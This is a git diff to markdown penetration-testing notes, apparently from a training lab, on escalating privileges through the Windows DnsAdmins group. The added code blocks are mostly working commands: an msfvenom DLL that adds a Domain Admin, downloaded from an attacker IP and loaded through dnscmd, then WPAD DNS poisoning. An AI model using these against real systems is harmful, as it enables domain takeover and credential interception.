@@ -79,7 +79,41 @@ The cmdlet can also be run as another user with the `-Credential` parameter.
 # DnsAdmins
 
 * DNS management is performed over RPC
-* ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
-* When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
+* [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
+* When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
 * When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
 * An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
+
+```bash
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+python3 -m http.server 7777
+```
+
+```Powershell
+wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+Get-ADGroupMember -Identity DnsAdmins
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+```
+
+Now finding the SID and Checking the permissions on the DNS specs.
+```Powershell
+wmic useraccount where name="netadm" get sid
+
+sc.exe sdshow DNS
+sc stop dns
+sc start dns
+net group "Domain Admins" /dom
+```
+
+##### Cleaning Up
+[Mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
+
+```Powershell
+reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+sc.exe start dns
+sc query dns
+
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
